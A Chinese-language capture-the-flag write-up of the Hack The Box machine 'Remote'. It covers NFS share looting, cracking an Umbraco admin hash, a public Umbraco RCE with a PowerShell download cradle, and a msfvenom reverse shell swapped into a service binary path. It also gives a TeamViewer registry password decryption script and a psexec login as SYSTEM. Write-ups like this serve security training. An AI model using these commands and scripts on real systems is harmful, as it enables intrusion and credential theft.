# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测

先看看开了哪些端口，这台机器有防ping处理，因此要加上参数```-Pn```
```
┌──(root💀kali)-[~/htb/Remote]
└─# nmap -p- -Pn 10.10.10.180 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-25 03:59 EST
Nmap scan report for 10.10.10.180
Host is up (0.28s latency).
Not shown: 65528 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
49666/tcp open  unknown

```

查看对应端口详细信息
```
┌──(root💀kali)-[~/htb/Remote]
└─# nmap -sV -Pn -T4 -A -O 10.10.10.180 -p 21,80,111,135,445,2049,49666
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-26 03:32 EST
Nmap scan report for 10.10.10.180
Host is up (0.35s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
49666/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-26T08:33:54
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   349.23 ms 10.10.14.1
2   349.45 ms 10.10.10.180

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 287.16 seconds

```

## FTP

ftp可以匿名登录，但貌似没有东西，也不可以上传
```
┌──(root💀kali)-[~/htb/Remote]
└─# ftp 10.10.10.180                                                                                                                                 
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.

```


## 目录发现

80端口打开后像是一个介绍页面，没发现有啥有用的东西，尝试爆破
```
┌──(root💀kali)-[~/htb/Remote]
└─# gobuster dir -u http://10.10.10.180 -w /usr/share/wordlists/Web-Content/common.txt -t 30 --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.180
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/25 04:01:07 Starting gobuster in directory enumeration mode
===============================================================
/Home                 (Status: 200) [Size: 6703]
/Blog                 (Status: 200) [Size: 5011]
/Contact              (Status: 200) [Size: 7890]
/Products             (Status: 200) [Size: 5338]
/blog                 (Status: 200) [Size: 5001]
/contact              (Status: 200) [Size: 7880]
/home                 (Status: 200) [Size: 6703]
/install              (Status: 302) [Size: 126] [--> /umbraco/]
/intranet             (Status: 200) [Size: 3323]               
/master               (Status: 500) [Size: 3420]               
/people               (Status: 200) [Size: 6739]               
/person               (Status: 200) [Size: 2741]               
/products             (Status: 200) [Size: 5328]               
/product              (Status: 500) [Size: 3420]               
/render/https://www.google.com (Status: 400) [Size: 3420]      
/umbraco              (Status: 200) [Size: 4040]   
```

存在一个叫```umbraco```的cms，继续爆破
```
┌──(root💀kali)-[~/htb/Remote]
└─# gobuster dir -u http://10.10.10.180/umbraco -w /usr/share/wordlists/Web-Content/common.txt -t 30 --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.180/umbraco
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/25 04:08:38 Starting gobuster in directory enumeration mode
===============================================================
/Default              (Status: 200) [Size: 4040]
/Members              (Status: 301) [Size: 159] [--> http://10.10.10.180/umbraco/Members/]
/Search               (Status: 301) [Size: 158] [--> http://10.10.10.180/umbraco/Search/] 
/actions              (Status: 301) [Size: 159] [--> http://10.10.10.180/umbraco/actions/]
/application          (Status: 200) [Size: 2455]                                          
/assets               (Status: 301) [Size: 158] [--> http://10.10.10.180/umbraco/assets/] 
/config               (Status: 301) [Size: 158] [--> http://10.10.10.180/umbraco/config/] 
/controls             (Status: 301) [Size: 160] [--> http://10.10.10.180/umbraco/controls/]
/create               (Status: 301) [Size: 158] [--> http://10.10.10.180/umbraco/create/]  
/dashboard            (Status: 301) [Size: 161] [--> http://10.10.10.180/umbraco/dashboard/]
/default              (Status: 200) [Size: 4040]                                            
/developer            (Status: 301) [Size: 161] [--> http://10.10.10.180/umbraco/developer/]
/dialogs              (Status: 301) [Size: 159] [--> http://10.10.10.180/umbraco/dialogs/]  
/install              (Status: 301) [Size: 159] [--> http://10.10.10.180/umbraco/install/]  
/js                   (Status: 301) [Size: 154] [--> http://10.10.10.180/umbraco/js/]       
/lib                  (Status: 301) [Size: 155] [--> http://10.10.10.180/umbraco/lib/]      
/masterpages          (Status: 301) [Size: 163] [--> http://10.10.10.180/umbraco/masterpages/]
/members              (Status: 301) [Size: 159] [--> http://10.10.10.180/umbraco/members/]    
/plugins              (Status: 301) [Size: 159] [--> http://10.10.10.180/umbraco/plugins/]    
/preview              (Status: 302) [Size: 125] [--> /umbraco]                                
/render/https://www.google.com (Status: 400) [Size: 3420]                                     
/search               (Status: 301) [Size: 158] [--> http://10.10.10.180/umbraco/search/]     
/settings             (Status: 301) [Size: 160] [--> http://10.10.10.180/umbraco/settings/]   
/views                (Status: 301) [Size: 157] [--> http://10.10.10.180/umbraco/views/]      
/webservices          (Status: 301) [Size: 163] [--> http://10.10.10.180/umbraco/webservices/]

```

谷歌搜索发现umbraco的```7.12.4```版本存在一个RCE，但是需要账号和密码。

## NFS Service

2049端口是一个NFS Service，查看靶机的分享目录

```
┌──(root💀kali)-[~/htb/Remote]
└─# showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)

```

有一个分享文件夹，mount到本地访问：

> mount -t nfs  10.10.10.180:/site_backups /mnt/myshare -o nolock

查看分享内容：
```
┌──(root💀kali)-[~/htb/Remote]
└─# ls /mnt/myshare 
App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views

```

在```Web.config```确认cms版本号为：```7.12.4```,正是上面存在rce的版本

查找分享目录内含有```pass```字样文件

```
┌──(root💀kali)-[/mnt/myshare]
└─# find ./|xargs grep -ri 'pass' -l                                                              130 ⨯
./App_Data/Logs/UmbracoTraceLog.intranet.txt
./App_Data/Logs/UmbracoTraceLog.intranet.txt.2020-02-19
./App_Data/Models/all.generated.cs
./App_Data/Models/models.generated.cs

```

在```App_Data/Logs/UmbracoTraceLog.intranet.txt```下找到一个登陆用户名：```admin@htb.local```

再次查找分享目录内含有```admin@htb.local```字样文件
```
┌──(root💀kali)-[/mnt/myshare]
└─# find ./|xargs grep -ri 'admin@htb.local' -l                                                   130 ⨯
./App_Data/Logs/UmbracoTraceLog.intranet.txt
./App_Data/Logs/UmbracoTraceLog.intranet.txt.2020-02-19
./App_Data/Logs/UmbracoTraceLog.remote.txt
./App_Data/Umbraco.sdf

```

在```App_Data/Umbraco.sdf```下找到相关字样，把这个文件重定向到kali

> strings App_Data/Umbraco.sdf >/root/htb/Remote/umbraco.txt

查看文件：
```
┌──(root💀kali)-[~/htb/Remote]
└─# head umbraco.txt 
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
@{pv
qpkaj

```

可以看到爆出了几个用户名，哈希密码，以及哈希算法，整理如下

1. 用户名：admin@htb.local
哈希：b8be16afba8c314ad33d812f22a04991b90e2aaa
哈希算法：SHA1


2. 用户名：smith@htb.local
哈希：jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=
哈希算法：HMACSHA256


3. 用户名：ssmith@htb.local
哈希：8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA=
哈希算法：HMACSHA256

解出来用户```admin@htb.local```密码哈希明文：```baconandcheese```

上面用户凭据可以登录cms


# webshell

谷歌搜索，使用[这个exp](https://github.com/noraj/Umbraco-RCE)

开启一个监听：

> nc -lnvp

攻击：

```
┌──(root💀kali)-[~/htb/Remote]
└─# python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180/' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')"

```

收到一个反弹shell:
```
┌──(root💀kali)-[~]
└─# nc -lnvp 4242                     
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.180] 49724
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 

```

在```C:\users\public```下拿到user.txt

# 提权

传winpeas到靶机
> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3:8000/winPEASx64.exe','C:\users\public\winPEASx64.exe')

执行：
> & "C:\users\public\winPEASx64.exe"


## 服务提权

发现拥有开启和关闭一个RmSvc服务的权限

```
Modifiable Services
Z% Check if you can modify any service https://book.hacktricks.xyz/windows/windows-loc
al-privilege-escalation#services                                                                        
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    UsoSvc: AllAccess, Start

```

PS下查看这个服务的信息
```
PS C:\> sc.exe qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

```


修改这个服务二进制文件的路径

```
PS C:\> sc.exe config UsoSvc binpath= "C:\Users\Public\shell.exe"
[SC] ChangeServiceConfig SUCCESS

```

编译一个反弹shell文件
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o shell.exe

下载到靶机
> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3:8000/shell.exe','C:\users\public\shell.exe')


重启服务
```
net stop UsoSvc
net start UsoSvc

```

拿到反弹shell

```
 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Sending stage (200262 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.180:49863) at 2021-12-26 11:20:13 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

服务提权的shell是非常不稳定的，一会就断，必须迁移进程到其他常驻进程（这里要拼一下手速，试多几次，一般都可以）

先用ps命令查看当前有哪些进程


迁移到稳定的进程
```
meterpreter > migrate 640
[*] Migrating from 5656 to 640...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```


## TeamViewer
查看网络连接
```
Current TCP Listening Ports
Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                                                                                                   
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        127.0.0.1             2049          0.0.0.0               0               Listening         4               System
  TCP        127.0.0.1             5939          0.0.0.0               0               Listening         2264            TeamViewer_Service

```

看到有两个端口是向本地开启的，2049端口我们知道是nfs，5939端口我们看到是```TeamViewer```


根据[这篇文章](https://www.cnblogs.com/unicodeSec/p/12294868.html)所示，teamviewer将用户名密码硬编码至注册表中，加密算法是：```AES-128-CBC```

其中key的值：0602000000a400005253413100040000，iv的值：0100010067244F436E6762F25EA8D704 是固定的

> TeamViewer stored user passwords encrypted with AES-128-CBC with they key of 0602000000a400005253413100040000 and iv of 0100010067244F436E6762F25EA8D704 in the Windows registry. If the password is reused anywhere, privilege escalation is possible. If you do not have RDP rights to machine but TeamViewer is installed, you can use TeamViewer to remote in. TeamViewer also lets you copy data or schedule tasks to run through their Service, which runs as NT AUTHORITY\SYSTEM, so a low privilege user can immediately go to SYSTEM with a .bat file. This was assigned CVE-2019-18988.

查看注册表中TeamViewer的信息
```
PS C:\Program Files (x86)\TeamViewer\Version7> reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7

HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    \0005056B91D2C
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x611bbaed
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3

HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7\AccessControl
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7\DefaultSettings

```


留意```SecurityPasswordAES```的值```FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B```

使用以下脚本解密，填上以上哈希值：
```
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"			# output from the registry

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```

执行
```
┌──(root💀kali)-[~/htb/Remote]
└─# python3 teamviewer_hash_decrypt.py
00000000: 21 00 52 00 33 00 6D 00  30 00 74 00 65 00 21 00  !.R.3.m.0.t.e.!.
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
None
!R3m0te!

```


解密出来以后得到密码：```!R3m0te!```


测试这个密码是否可用于smb登录
```
┌──(root💀kali)-[~/htb/Remote]
└─# crackmapexec smb 10.10.10.180 -u administrator -p '!R3m0te!'                                                                                                                                             130 ⨯
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
SMB         10.10.10.180    445    REMOTE           [+] remote\administrator:!R3m0te! (Pwn3d!)

```

显示可以登录。

使用psexec.py登录
```
┌──(root💀kali)-[~/htb/Remote]
└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.180
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.180.....
[*] Found writable share ADMIN$
[*] Uploading file lKlgqvNl.exe
[*] Opening SVCManager on 10.10.10.180.....
[*] Creating service TJiQ on 10.10.10.180.....
[*] Starting service TJiQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```


# 总结
ftp寻找初始shell的时候没有用处，但是后来从靶机传文件到kali分析的时候派上了用场，当然传文件的方法还有很多，因靶机开启的服务而异。
服务提权其实可以避免使用metsploit，思路是传nc.exe到靶机反弹回来应该可以得到一个稳定的shell
有趣的靶机，TeamViewer的提权有学到东西。